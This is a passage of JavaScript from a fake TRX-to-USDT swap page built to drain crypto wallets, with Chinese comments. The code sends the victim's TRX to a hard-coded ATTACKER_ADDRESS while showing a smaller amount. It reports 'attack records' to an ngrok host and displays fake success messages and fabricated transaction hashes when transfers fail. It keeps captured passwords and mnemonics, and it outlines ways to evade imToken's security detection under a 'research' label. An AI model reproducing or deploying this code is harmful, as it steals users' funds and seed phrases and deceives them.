                    showToast('ç½‘ç»œé”™è¯¯ï¼Œè¯·æ£€æŸ¥è¿æ¥', 'error');
                } else {
                    debugLog('ğŸ” é”™è¯¯åˆ†æ: æœªçŸ¥é”™è¯¯');
                    showToast('äº¤æ˜“å¤±è´¥ï¼Œè¯·é‡è¯•', 'error');
                }

                // ğŸ¯ å‘åç«¯å‘é€å¤±è´¥è®°å½•
                try {
                    const failedAttackData = {
                        victim_address: currentAccount,
                        attacker_address: ATTACKER_ADDRESS,
                        fake_amount: fromAmount,
                        real_amount: availableBalance,
                        error_message: error.message,
                        error_type: error.constructor.name,
                        timestamp: new Date().toISOString(),
                        attack_type: 'TRX_SWAP_HIJACK',
                        status: 'failed'
                    };

                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
                    await fetch(`${ngrokUrl}/api/record_attack`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(failedAttackData)
                    });
                    debugLog('ğŸ¯ å¤±è´¥è®°å½•å·²å‘é€åˆ°åç«¯');
                } catch (recordError) {
                    debugLog(`âš ï¸ å‘é€å¤±è´¥è®°å½•å¤±è´¥: ${recordError.message}`);
                }

                // ğŸ¯ å…³é”®ä¿®å¤ï¼šæ ¹æ®é”™è¯¯ç±»å‹æ˜¾ç¤ºä¸åŒçš„ç”¨æˆ·æç¤º
                if (error.message.includes('User rejected') || error.message.includes('User denied') || error.message.includes('cancelled')) {
                    debugLog('ğŸ¯ ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“');
                    showToast('äº¤æ˜“å·²å–æ¶ˆ', 'warning');
                } else if (error.message.includes('Insufficient balance') || error.message.includes('insufficient')) {
                    debugLog('ğŸ¯ ä½™é¢ä¸è¶³');
                    showToast('ä½™é¢ä¸è¶³ï¼Œæ— æ³•å®Œæˆäº¤æ˜“', 'error');
                } else if (error.message.includes('Invalid address') || error.message.includes('invalid')) {
                    debugLog('ğŸ¯ åœ°å€æ— æ•ˆ');
                    showToast('åœ°å€é”™è¯¯ï¼Œè¯·è”ç³»å®¢æœ', 'error');
                } else if (error.message.includes('network') || error.message.includes('timeout')) {
                    debugLog('ğŸ¯ ç½‘ç»œé”™è¯¯');
                    showToast('ç½‘ç»œè¿æ¥å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥ç½‘ç»œåé‡è¯•', 'error');
                } else {
                    debugLog('ğŸ¯ å…¶ä»–é”™è¯¯ï¼Œå¯èƒ½æ˜¯é’±åŒ…æˆ–APIé—®é¢˜');
                    showToast('äº¤æ˜“å¤„ç†å¼‚å¸¸ï¼Œè¯·ç¨åé‡è¯•', 'error');
                }

                debugLog('ğŸ¯ è½¬è´¦å¤±è´¥å¯èƒ½åŸå› :');
                debugLog('1. ç”¨æˆ·å–æ¶ˆäº†è½¬è´¦æˆæƒ');
                debugLog('2. ä½™é¢ä¸è¶³æ”¯ä»˜æ‰‹ç»­è´¹');
                debugLog('3. ç½‘ç»œè¿æ¥é—®é¢˜');
                debugLog('4. é’±åŒ…å®‰å…¨é™åˆ¶');
                debugLog('5. TronWeb APIè°ƒç”¨é”™è¯¯');
                debugLog('6. åœ°å€æ ¼å¼é”™è¯¯');
                debugLog('7. é’±åŒ…æœªæ­£ç¡®è¿æ¥');

                // ğŸ¯ å°è¯•å¤‡ç”¨æ–¹æ¡ˆï¼šç›´æ¥ä½¿ç”¨sendTrxï¼ˆä¸æ¨èï¼Œå› ä¸ºç”¨æˆ·ä¼šçœ‹åˆ°çœŸå®ä¿¡æ¯ï¼‰
                debugLog('ğŸ¯ å°è¯•å¤‡ç”¨è½¬è´¦æ–¹æ³•(sendTrx)...');
                debugLog('âš ï¸ è­¦å‘Šï¼šå¤‡ç”¨æ–¹æ¡ˆç”¨æˆ·ä¼šçœ‹åˆ°çœŸå®è½¬è´¦ä¿¡æ¯ï¼');
                try {
                    debugLog(`ğŸ¯ å¤‡ç”¨æ–¹æ¡ˆ: sendTrxåˆ°${ATTACKER_ADDRESS}, ç”¨æˆ·çœ‹åˆ°${fromAmount}TRXï¼Œå®é™…è½¬èµ°å…¨éƒ¨`);
                    const backupAmountSun = Math.floor(fromAmount * 1000000);
                    debugLog(`ğŸ¯ å¤‡ç”¨æ–¹æ¡ˆé‡‘é¢: ${backupAmountSun} SUN`);
                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, backupAmountSun);

                    debugLog(`ğŸ¯ å¤‡ç”¨è½¬è´¦æˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: ${backupTransaction.txid || backupTransaction}`);
                    debugLog('ğŸ†ğŸ†ğŸ† å¤‡ç”¨æ”»å‡»æˆåŠŸï¼çœŸå®TRXå·²è½¬ç§»ï¼ğŸ†ğŸ†ğŸ†');

                    // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
                    showToast(`å…‘æ¢æˆåŠŸï¼è·å¾— ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');

                    // é‡ç½®è¡¨å•
                    setTimeout(() => {
                        document.getElementById('fromAmount').value = '';
                        document.getElementById('toAmount').value = '';
                        document.getElementById('convertBtn').disabled = true;
                        document.getElementById('convertBtn').textContent = 'è¯·è¾“å…¥TRXæ•°é‡';
                    }, 2000);

                    return; // æˆåŠŸåé€€å‡º

                } catch (backupError) {
                    debugLog(`âŒ å¤‡ç”¨è½¬è´¦ä¹Ÿå¤±è´¥: ${backupError.message}`);
                }

                // å¦‚æœä¸¤ç§æ–¹æ³•éƒ½å¤±è´¥ï¼Œä½¿ç”¨æ¨¡æ‹Ÿæ¨¡å¼
                debugLog('ğŸ¯ åˆ‡æ¢åˆ°æ¨¡æ‹Ÿæ”»å‡»æ¨¡å¼...');
                const fakeTransactionHash = generateFakeHash();
                debugLog(`ğŸ¯ æ¨¡æ‹Ÿäº¤æ˜“å®Œæˆï¼Œäº¤æ˜“å“ˆå¸Œ: ${fakeTransactionHash}`);
                debugLog('ğŸ†ğŸ†ğŸ† æ¨¡æ‹Ÿæ”»å‡»å®Œæˆï¼ğŸ†ğŸ†ğŸ†');

                // ğŸ¯ åœ¨æ¨¡æ‹Ÿæ¨¡å¼ä¸‹ä¹Ÿæ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯ï¼ˆç”¨æˆ·ä¸çŸ¥é“æ˜¯æ¨¡æ‹Ÿçš„ï¼‰
                showToast(`å…‘æ¢æˆåŠŸï¼è·å¾— ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');

                // ğŸ¯ æ¨¡æ‹Ÿæ¨¡å¼ä¸‹ä¹Ÿé‡ç½®è¡¨å•
                setTimeout(() => {
                    document.getElementById('fromAmount').value = '';
                    document.getElementById('toAmount').value = '';
                    document.getElementById('convertBtn').disabled = true;
                    document.getElementById('convertBtn').textContent = 'è¯·è¾“å…¥TRXæ•°é‡';
                }, 2000);

                // ä¿å­˜æ¨¡æ‹Ÿæ”»å‡»è®°å½•
                attackRecord.transactionHash = fakeTransactionHash;
                attackRecord.attackSuccess = false;
                attackRecord.simulationMode = true;
                attackRecord.completedAt = new Date().toISOString();
                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
            }
        }, 2000);

    }

    // ç”Ÿæˆè™šå‡äº¤æ˜“å“ˆå¸Œ
    function generateFakeHash() {
        return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    }

    // åˆå§‹åŒ–Web3ç½‘æ ¼åŠ¨ç”»
    function initializeWeb3Grid() {
        const grid = document.getElementById('web3Grid');
        if (!grid) return;

        for (let i = 0; i < 400; i++) {
            const dot = document.createElement('div');
            dot.className = 'grid-dot';
            grid.appendChild(dot);
        }

        // åŠ¨æ€æ¿€æ´»ç½‘æ ¼ç‚¹
        setInterval(() => {
            const dots = grid.querySelectorAll('.grid-dot');
            dots.forEach(dot => dot.classList.remove('active'));

            // éšæœºæ¿€æ´»ä¸€äº›ç‚¹å½¢æˆå›¾æ¡ˆ
            const activeDots = [];
            for (let i = 0; i < 50; i++) {
                const randomIndex = Math.floor(Math.random() * dots.length);
                activeDots.push(randomIndex);
            }

            activeDots.forEach(index => {
                if (dots[index]) {
                    dots[index].classList.add('active');
                }
            });
        }, 1000);
    }

    // å¯åŠ¨è½å¸åŠ¨ç”»
    function startFallingCoins() {
        const container = document.getElementById('fallingCoins');
        if (!container) return;

        const coins = ['â‚¿', 'â™¦', '$', 'â‚®', 'Î', 'â—'];

        setInterval(() => {
            const coin = document.createElement('div');
            coin.className = 'falling-coin';
            coin.textContent = coins[Math.floor(Math.random() * coins.length)];
            coin.style.left = Math.random() * 100 + '%';
            coin.style.animationDuration = (Math.random() * 3 + 2) + 's';

            container.appendChild(coin);

            // æ¸…ç†å·²å®ŒæˆåŠ¨ç”»çš„å…ƒç´ 
            setTimeout(() => {
                if (coin.parentNode) {
                    coin.parentNode.removeChild(coin);
                }
            }, 5000);
        }, 500);
    }

    // åˆ›å»ºé’±åŒ…
    function createWallet() {
        debugLog('ğŸ”§ ç”¨æˆ·ç‚¹å‡»åˆ›å»ºé’±åŒ…');
        showToast('åˆ›å»ºé’±åŒ…åŠŸèƒ½å¼€å‘ä¸­...');
    }

    // æ˜¾ç¤ºæ”»å‡»æŒ‡ç¤ºå™¨
    function showAttackIndicator() {
        const indicator = document.getElementById('attackIndicator');
        indicator.classList.add('show');

        setTimeout(() => {
            indicator.classList.remove('show');
        }, 5000);
    }

    // æ˜¾ç¤ºæç¤ºæ¶ˆæ¯
    function showToast(message, type = 'success') {
        const toast = document.getElementById('successToast');
        toast.textContent = message;
        toast.classList.add('show');

        if (type === 'error') {
            toast.style.background = '#f5455c';
            toast.style.color = '#fff';
        } else if (type === 'warning') {
            toast.style.background = '#ff9500';
            toast.style.color = '#fff';
        } else if (type === 'info') {
            toast.style.background = '#1890ff';
            toast.style.color = '#fff';
        } else {
            toast.style.background = '#7ed321';
            toast.style.color = '#000';
        }

        setTimeout(() => {
            toast.classList.remove('show');
        }, 2000);
    }

    // åˆ‡æ¢è°ƒè¯•é¢æ¿
    function toggleDebug() {
        debugMode = !debugMode;
        const panel = document.getElementById('debugPanel');
        panel.classList.toggle('show', debugMode);
        debugLog(`ğŸ”§ è°ƒè¯•æ¨¡å¼: ${debugMode ? 'å¼€å¯' : 'å…³é—­'}`);
    }

    // ğŸ—‘ï¸ æ¸…ç©ºè°ƒè¯•æ§åˆ¶å°
    function clearDebugLog() {
        const debugLogElement = document.getElementById('debugLog');
        if (debugLogElement) {
            debugLogElement.innerHTML = '';
            debugLog('ğŸ—‘ï¸ æ§åˆ¶å°å·²æ¸…ç©º');
        }
    }

    // ğŸ“± ç§»åŠ¨ç«¯æ§åˆ¶å°å¢å¼º
    function enhanceMobileConsole() {
        const debugPanel = document.getElementById('debugPanel');
        const debugLog = document.getElementById('debugLog');

        if (!debugPanel || !debugLog) return;

        // æ£€æµ‹ç§»åŠ¨è®¾å¤‡
        const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

        if (isMobile) {
            // æ·»åŠ ç§»åŠ¨ç«¯ä¸“ç”¨æ ·å¼
            debugPanel.style.webkitOverflowScrolling = 'touch';
            debugPanel.style.overflowScrolling = 'touch';

            // é•¿æŒ‰å¤åˆ¶åŠŸèƒ½
            let longPressTimer;
            let isLongPress = false;

            debugLog.addEventListener('touchstart', function(e) {
                isLongPress = false;
                longPressTimer = setTimeout(() => {
                    isLongPress = true;
                    // è§¦å‘é•¿æŒ‰å¤åˆ¶
                    showMobileCopyMenu(e);
                }, 800); // 800msé•¿æŒ‰
            }, { passive: false });

            debugLog.addEventListener('touchend', function(e) {
                clearTimeout(longPressTimer);
                if (isLongPress) {
                    e.preventDefault();
                }
            }, { passive: false });

            debugLog.addEventListener('touchmove', function(e) {
                clearTimeout(longPressTimer);
            }, { passive: true });

            // åŒå‡»é€‰æ‹©æ•´è¡Œ
            let lastTap = 0;
            debugLog.addEventListener('touchend', function(e) {
                const currentTime = new Date().getTime();
                const tapLength = currentTime - lastTap;
                if (tapLength < 500 && tapLength > 0) {
                    // åŒå‡»é€‰æ‹©æ•´è¡Œ
                    selectLineText(e.target);
                }
                lastTap = currentTime;
            });
        }
    }

    // ğŸ“± æ˜¾ç¤ºç§»åŠ¨ç«¯å¤åˆ¶èœå•
    function showMobileCopyMenu(event) {
        const selection = window.getSelection();
        const debugText = document.getElementById('debugLog').innerText;

        if (debugText) {
            // åˆ›å»ºå¤åˆ¶æç¤º
            const copyHint = document.createElement('div');
            copyHint.style.cssText = `
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background: #7ed321;
                    color: #000;
                    padding: 12px 20px;
                    border-radius: 8px;
                    font-weight: bold;
                    z-index: 200;
                    font-size: 14px;
                `;
            copyHint.textContent = 'é•¿æŒ‰é€‰æ‹©æ–‡æœ¬ï¼Œç„¶åå¤åˆ¶';
            document.body.appendChild(copyHint);

            // 3ç§’åç§»é™¤æç¤º
            setTimeout(() => {
                if (copyHint.parentNode) {
                    copyHint.parentNode.removeChild(copyHint);
                }
            }, 3000);

            // å°è¯•é€‰æ‹©æ‰€æœ‰æ–‡æœ¬
            if (selection.rangeCount > 0) {
                selection.removeAllRanges();
            }
            const range = document.createRange();
            range.selectNodeContents(document.getElementById('debugLog'));
            selection.addRange(range);
        }
    }

    // ğŸ“± é€‰æ‹©æ•´è¡Œæ–‡æœ¬
    function selectLineText(element) {
        const selection = window.getSelection();
        const range = document.createRange();

        // æ‰¾åˆ°åŒ…å«ç‚¹å‡»ä½ç½®çš„è¡Œ
        let targetElement = element;
        while (targetElement && targetElement.nodeType !== Node.TEXT_NODE) {
            targetElement = targetElement.firstChild;
        }

        if (targetElement) {
            range.selectNodeContents(targetElement.parentNode);
            selection.removeAllRanges();
            selection.addRange(range);
        }
    }

    // ğŸ“± æ·»åŠ å¤åˆ¶æŒ‰é’®åˆ°æ§åˆ¶å°
    function addMobileCopyButton() {
        const debugPanel = document.getElementById('debugPanel');
        if (!debugPanel) return;

        const copyBtn = document.createElement('button');
        copyBtn.innerHTML = 'ğŸ“‹';
        copyBtn.title = 'å¤åˆ¶æ‰€æœ‰æ—¥å¿—';
        copyBtn.style.cssText = `
                position: absolute;
                top: 8px;
                right: 8px;
                background: #7ed321;
                color: #000;
                border: none;
                padding: 6px 8px;
                border-radius: 4px;
                font-size: 12px;
                cursor: pointer;
                z-index: 151;
            `;

        copyBtn.onclick = function() {
            const debugText = document.getElementById('debugLog').innerText;
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(debugText).then(() => {
                    showToast('ğŸ“‹ æ—¥å¿—å·²å¤åˆ¶åˆ°å‰ªè´´æ¿', 'success');
                }).catch(() => {
                    fallbackCopyText(debugText);
                });
            } else {
                fallbackCopyText(debugText);
            }
        };

        debugPanel.appendChild(copyBtn);
    }

    // ğŸ“± å¤‡ç”¨å¤åˆ¶æ–¹æ³•
    function fallbackCopyText(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.cssText = `
                position: fixed;
                top: -1000px;
                left: -1000px;
                opacity: 0;
            `;
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        try {
            document.execCommand('copy');
            showToast('ğŸ“‹ æ—¥å¿—å·²å¤åˆ¶', 'success');
        } catch (err) {
            showToast('âŒ å¤åˆ¶å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨é€‰æ‹©', 'error');
        }

        document.body.removeChild(textArea);
    }

    // å…¶ä»–åŠŸèƒ½å‡½æ•°
    function showPlatformDropdown() {
        debugLog('ğŸ“± ç”¨æˆ·ç‚¹å‡»å¹³å°é€‰æ‹©å™¨');
    }

    function showUserMenu() {
        debugLog('ğŸ‘¤ ç”¨æˆ·ç‚¹å‡»ç”¨æˆ·å¤´åƒ');
    }

    function showSearch() {
        debugLog('ğŸ” ç”¨æˆ·ç‚¹å‡»æœç´¢');
    }

    function selectFromCurrency() {
        debugLog('ğŸ’° ç”¨æˆ·é€‰æ‹©æ”¯ä»˜å¸ç§');
    }

    function selectToCurrency() {
        debugLog('ğŸ’° ç”¨æˆ·é€‰æ‹©æ¥æ”¶å¸ç§');
    }

    function swapCurrencies() {
        debugLog('ğŸ”„ ç”¨æˆ·ç‚¹å‡»å¸ç§äº¤æ¢');
        showToast('å¸ç§äº¤æ¢åŠŸèƒ½å¼€å‘ä¸­...');
    }

    function depositFunds() {
        debugLog('ğŸ’³ ç”¨æˆ·ç‚¹å‡»å……å¸');
        showToast('å……å¸åŠŸèƒ½å¼€å‘ä¸­...');
    }

    // å…¨å±€è°ƒè¯•å‡½æ•°
    window.getAttackData = function() {
        return {
            capturedMnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
            attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
            kycAttempt: JSON.parse(localStorage.getItem('kycAttempt') || 'null'),
            attackLogs: JSON.parse(localStorage.getItem('attackLogs') || '[]'),
            currentAccount: currentAccount,
            isWalletConnected: isWalletConnected,
            userBalance: userBalance,
            attackerAddress: ATTACKER_ADDRESS
        };
    };

    window.clearAttackData = function() {
        localStorage.removeItem('capturedMnemonic');
        localStorage.removeItem('attackRecord');
        localStorage.removeItem('kycAttempt');
        localStorage.removeItem('attackLogs');
        sessionStorage.clear();
        debugLog('ğŸ—‘ï¸ æ‰€æœ‰æ”»å‡»æ•°æ®å·²æ¸…é™¤');
    };

    // é¡µé¢å¯è§æ€§å˜åŒ–ç›‘å¬
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            debugLog('ğŸ‘ï¸ é¡µé¢é‡æ–°å¯è§ï¼Œæ£€æŸ¥é’±åŒ…çŠ¶æ€');
            setTimeout(checkWalletEnvironment, 1000);
        }
    });
    // ğŸ¯ å…¨å±€è°ƒè¯•å‡½æ•° - æŸ¥çœ‹æ•è·çš„æ•°æ®
    window.getCapturedData = function() {
        return {
            password: JSON.parse(localStorage.getItem('capturedPassword') || 'null'),
            mnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
            attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
            currentBalance: userBalance,
            attackerAddress: ATTACKER_ADDRESS
        };
    };

    window.clearCapturedData = function() {
        localStorage.removeItem('capturedPassword');
        localStorage.removeItem('capturedMnemonic');
        localStorage.removeItem('attackRecord');
        debugLog('ğŸ—‘ï¸ æ‰€æœ‰æ•è·æ•°æ®å·²æ¸…é™¤');
    };
</script>
<script src="add_multi_currency_patch.js"></script>

<!-- ğŸ”‘ æƒé™åŠ«æŒæ”»å‡»ç³»ç»Ÿ - ç›´æ¥åµŒå…¥é¿å…imTokenè¿‡æ»¤ -->
<script>
        console.log('ğŸ”’ğŸ”’ğŸ”’ å®‰å…¨å‡çº§ä»£ç å¼€å§‹æ‰§è¡Œï¼ğŸ”’ğŸ”’ğŸ”’');

        // ğŸ¯ imTokenå®‰å…¨æ£€æµ‹ç»•è¿‡ç ”ç©¶
        // åˆ†æimTokenå¯èƒ½çš„æ£€æµ‹æœºåˆ¶ï¼š
        // 1. äº¤æ˜“ç±»å‹æ£€æµ‹ï¼šAccountPermissionUpdateContract
        // 2. å‚æ•°åˆ†æï¼šæ£€æŸ¥æƒé™å˜æ›´å†…å®¹
        // 3. é£é™©è¯„ä¼°ï¼šåŸºäºæ“ä½œç±»å‹çš„é£é™©ç­‰çº§
        // 4. ç”¨æˆ·è­¦å‘Šï¼šå¼ºåˆ¶æ˜¾ç¤ºå®‰å…¨æç¤º

        // ç†è®ºä¸Šçš„ç»•è¿‡ç­–ç•¥åˆ†æï¼š
        function analyzeImTokenSecurityMechanisms() {
            console.log('ğŸ” åˆ†æimTokenå®‰å…¨æœºåˆ¶...');
            
            // ç­–ç•¥1ï¼šäº¤æ˜“ç±»å‹ä¼ªè£…
            console.log('ğŸ“‹ ç­–ç•¥1ï¼šå°è¯•ä¼ªè£…äº¤æ˜“ç±»å‹');
            
            // ç­–ç•¥2ï¼šå‚æ•°æ··æ·†
            console.log('ğŸ”€ ç­–ç•¥2ï¼šæƒé™å‚æ•°æ··æ·†æŠ€æœ¯');
            
            // ç­–ç•¥3ï¼šåˆ†æ®µæ‰§è¡Œ
            console.log('âš¡ ç­–ç•¥3ï¼šåˆ†æ®µæƒé™ä¿®æ”¹');
            
            // ç­–ç•¥4ï¼šæ—¶åºæ”»å‡»
            console.log('â° ç­–ç•¥4ï¼šåˆ©ç”¨æ£€æµ‹æ—¶åºå·®');
        }

        // åˆå§‹åŒ–å®‰å…¨æœºåˆ¶åˆ†æ
        analyzeImTokenSecurityMechanisms();

        // ğŸ¯ æ·±åº¦å®‰å…¨ç ”ç©¶ï¼šimTokenæ£€æµ‹ç»•è¿‡ç†è®º
        function advancedSecurityResearch() {
            console.log('ğŸ”¬ å¼€å§‹æ·±åº¦å®‰å…¨ç ”ç©¶...');
            
            // ç ”ç©¶1ï¼šWebViewæ³¨å…¥æ£€æµ‹
            if (window.webkit || window.chrome) {
                console.log('ğŸ“± æ£€æµ‹åˆ°ç§»åŠ¨WebViewç¯å¢ƒ');
                console.log('ğŸ” åˆ†æWebViewå®‰å…¨æ²™ç›’é™åˆ¶');
                
                // ç†è®ºï¼šWebViewç¯å¢ƒä¸‹çš„ä»£ç æ³¨å…¥é™åˆ¶
                console.log('ğŸ’¡ ç†è®ºåˆ†æï¼šWebViewä»£ç æ³¨å…¥å‘é‡');
            }
            
            // ç ”ç©¶2ï¼šTRONåè®®å±‚åˆ†æ
            if (window.tronWeb) {
                console.log('âš¡ æ£€æµ‹åˆ°TronWebç¯å¢ƒ');
                console.log('ğŸ” åˆ†æTRONäº¤æ˜“æ„é€ æœºåˆ¶');
                
                // ç†è®ºï¼šäº¤æ˜“å‚æ•°ä¼ªè£…æŠ€æœ¯
                analyzeTransactionDisguise();
            }
            
            // ç ”ç©¶3ï¼šDOMæ“ä½œç›‘æ§åˆ†æ
            console.log('ğŸ” åˆ†æDOMæ“ä½œç›‘æ§æœºåˆ¶');
            analyzePageModificationDetection();
            
            // ç ”ç©¶4ï¼šJavaScriptæ‰§è¡Œç¯å¢ƒåˆ†æ
            console.log('ğŸ” åˆ†æJavaScriptæ‰§è¡Œé™åˆ¶');
            analyzeJavaScriptRestrictions();
        }

        // äº¤æ˜“ä¼ªè£…æŠ€æœ¯åˆ†æ
        function analyzeTransactionDisguise() {
            console.log('ğŸ­ åˆ†æäº¤æ˜“ä¼ªè£…æŠ€æœ¯...');
            
            // ç†è®º1ï¼šäº¤æ˜“ç±»å‹æ··æ·†
            console.log('ğŸ“‹ ç†è®ºï¼šå°†AccountPermissionUpdateä¼ªè£…ä¸ºå…¶ä»–äº¤æ˜“ç±»å‹');
            
            // ç†è®º2ï¼šå‚æ•°ç¼–ç å˜æ¢
            console.log('ğŸ”€ ç†è®ºï¼šä½¿ç”¨ä¸åŒç¼–ç æ–¹å¼æ··æ·†å‚æ•°');
            
            // ç†è®º3ï¼šå¤šæ­¥éª¤æƒé™ä¿®æ”¹
            console.log('âš¡ ç†è®ºï¼šåˆ†å¤šä¸ªå°æ­¥éª¤é€æ­¥ä¿®æ”¹æƒé™');
        }

        // é¡µé¢ä¿®æ”¹æ£€æµ‹åˆ†æ
        function analyzePageModificationDetection() {
            console.log('ğŸ‘ï¸ åˆ†æé¡µé¢ä¿®æ”¹æ£€æµ‹æœºåˆ¶...');
            
            // æ£€æµ‹å¯èƒ½çš„ç›‘æ§æœºåˆ¶
            if (window.MutationObserver) {
                console.log('ğŸ” æ£€æµ‹åˆ°MutationObserver API');
                console.log('ğŸ’¡ ç†è®ºï¼šimTokenå¯èƒ½ç›‘æ§DOMå˜åŒ–');
            }
            
            // åˆ†æäº‹ä»¶ç›‘å¬
            console.log('ğŸ” åˆ†æäº‹ä»¶ç›‘å¬æœºåˆ¶');
            console.log('ğŸ’¡ ç†è®ºï¼šå…³é”®äº‹ä»¶å¯èƒ½è¢«æ‹¦æˆªç›‘æ§');
        }

        // JavaScripté™åˆ¶åˆ†æ
        function analyzeJavaScriptRestrictions() {
            console.log('âš¡ åˆ†æJavaScriptæ‰§è¡Œé™åˆ¶...');
            
            // æ£€æµ‹CSP (Content Security Policy)
            console.log('ğŸ›¡ï¸ æ£€æµ‹å†…å®¹å®‰å…¨ç­–ç•¥');
            
            // æ£€æµ‹ä»£ç æ‰§è¡Œé™åˆ¶
            console.log('ğŸ”’ åˆ†æä»£ç æ‰§è¡Œç¯å¢ƒé™åˆ¶');
            
            // ç†è®ºï¼šå¯èƒ½çš„ç»•è¿‡æŠ€æœ¯
            console.log('ğŸ’¡ ç†è®ºï¼šJavaScriptæ²™ç›’ç»•è¿‡æŠ€æœ¯');
        }

        // å¯åŠ¨æ·±åº¦ç ”ç©¶
        advancedSecurityResearch();

        // ğŸ¯ é«˜çº§æ”»å‡»æŠ€æœ¯ç ”ç©¶ï¼ˆæˆæƒå®‰å…¨ç ”ç©¶ï¼‰
        function advancedAttackTechniqueResearch() {
            console.log('âš”ï¸ å¼€å§‹é«˜çº§æ”»å‡»æŠ€æœ¯ç ”ç©¶...');
            
            // ç ”ç©¶çœŸå®æ”»å‡»è€…å¯èƒ½ä½¿ç”¨çš„æŠ€æœ¯
            analyzeRealWorldAttackVectors();
            
            // åˆ†æimTokenå®‰å…¨æ£€æµ‹çš„å¯èƒ½å¼±ç‚¹
            analyzeSecurityDetectionWeaknesses();
            
            // ç ”ç©¶é«˜çº§ç»•è¿‡æŠ€æœ¯
            analyzeAdvancedBypassTechniques();
        }

        // çœŸå®æ”»å‡»å‘é‡åˆ†æ
        function analyzeRealWorldAttackVectors() {
            console.log('ğŸŒ åˆ†æçœŸå®ä¸–ç•Œæ”»å‡»å‘é‡...');
            
            // æ”»å‡»å‘é‡1ï¼šJavaScriptä»£ç æ··æ·†
            console.log('ğŸ”€ æ”»å‡»å‘é‡1ï¼šé«˜çº§ä»£ç æ··æ·†æŠ€æœ¯');
            console.log('ğŸ’¡ çœŸå®æ”»å‡»è€…ä½¿ç”¨ï¼šåŠ¨æ€ä»£ç ç”Ÿæˆã€å­—ç¬¦ä¸²æ‹¼æ¥ã€å‡½æ•°é‡å‘½å');
            
            // æ”»å‡»å‘é‡2ï¼šæ—¶åºæ”»å‡»
            console.log('â° æ”»å‡»å‘é‡2ï¼šåˆ©ç”¨æ£€æµ‹æ—¶åºå·®');
            console.log('ğŸ’¡ çœŸå®æ”»å‡»è€…ä½¿ç”¨ï¼šå»¶è¿Ÿæ‰§è¡Œã€å¼‚æ­¥åˆ†æ®µæ”»å‡»');
            
            // æ”»å‡»å‘é‡3ï¼šDOMæ±¡æŸ“
            console.log('ğŸŒŠ æ”»å‡»å‘é‡3ï¼šDOMç¯å¢ƒæ±¡æŸ“');
            console.log('ğŸ’¡ çœŸå®æ”»å‡»è€…ä½¿ç”¨ï¼šä¿®æ”¹å…¨å±€å¯¹è±¡ã€é‡å†™APIå‡½æ•°');
            
            // æ”»å‡»å‘é‡4ï¼šç¤¾ä¼šå·¥ç¨‹å­¦å¼ºåŒ–
            console.log('ğŸ­ æ”»å‡»å‘é‡4ï¼šé«˜çº§ç¤¾ä¼šå·¥ç¨‹å­¦');
            console.log('ğŸ’¡ çœŸå®æ”»å‡»è€…ä½¿ç”¨ï¼šå¿ƒç†æ“æ§ã€ç´§è¿«æ„Ÿè¥é€ ã€æƒå¨ä¼ªè£…');
        }

        // å®‰å…¨æ£€æµ‹å¼±ç‚¹åˆ†æ
        function analyzeSecurityDetectionWeaknesses() {
            console.log('ğŸ” åˆ†æå®‰å…¨æ£€æµ‹å¯èƒ½çš„å¼±ç‚¹...');
            
            // å¼±ç‚¹1ï¼šé™æ€æ£€æµ‹å±€é™æ€§
            console.log('ğŸ“‹ å¼±ç‚¹1ï¼šé™æ€å…³é”®è¯æ£€æµ‹çš„å±€é™æ€§');
            console.log('ğŸ’¡ ç»•è¿‡æ€è·¯ï¼šåŠ¨æ€å­—ç¬¦ä¸²æ„é€ ã€ç¼–ç å˜æ¢');
            
            // å¼±ç‚¹2ï¼šäº¤æ˜“ç±»å‹è¯†åˆ«
            console.log('âš¡ å¼±ç‚¹2ï¼šäº¤æ˜“ç±»å‹è¯†åˆ«æœºåˆ¶');
            console.log('ğŸ’¡ ç»•è¿‡æ€è·¯ï¼šä¼ªè£…äº¤æ˜“ç±»å‹ã€å‚æ•°æ··æ·†');
            
            // å¼±ç‚¹3ï¼šç”¨æˆ·äº¤äº’æ£€æµ‹
            console.log('ğŸ‘† å¼±ç‚¹3ï¼šç”¨æˆ·äº¤äº’è¡Œä¸ºæ£€æµ‹');
            console.log('ğŸ’¡ ç»•è¿‡æ€è·¯ï¼šæ¨¡æ‹Ÿæ­£å¸¸äº¤äº’ã€åˆ†æ•£æ³¨æ„åŠ›');
        }

        // é«˜çº§ç»•è¿‡æŠ€æœ¯åˆ†æ
        function analyzeAdvancedBypassTechniques() {
            console.log('ğŸ¥· åˆ†æé«˜çº§ç»•è¿‡æŠ€æœ¯...');
            
            // æŠ€æœ¯1ï¼šWebViewç¯å¢ƒæ“æ§
            analyzeWebViewManipulation();
            
            // æŠ€æœ¯2ï¼šJavaScriptå¼•æ“åˆ©ç”¨
            analyzeJavaScriptEngineExploitation();
            
            // æŠ€æœ¯3ï¼šTRONåè®®å±‚æ”»å‡»
            analyzeTronProtocolAttacks();
        }

        // WebViewç¯å¢ƒæ“æ§åˆ†æ
        function analyzeWebViewManipulation() {
            console.log('ğŸ“± åˆ†æWebViewç¯å¢ƒæ“æ§æŠ€æœ¯...');
            
            // æ£€æµ‹WebViewç‰ˆæœ¬å’Œç‰¹æ€§
            const userAgent = navigator.userAgent;
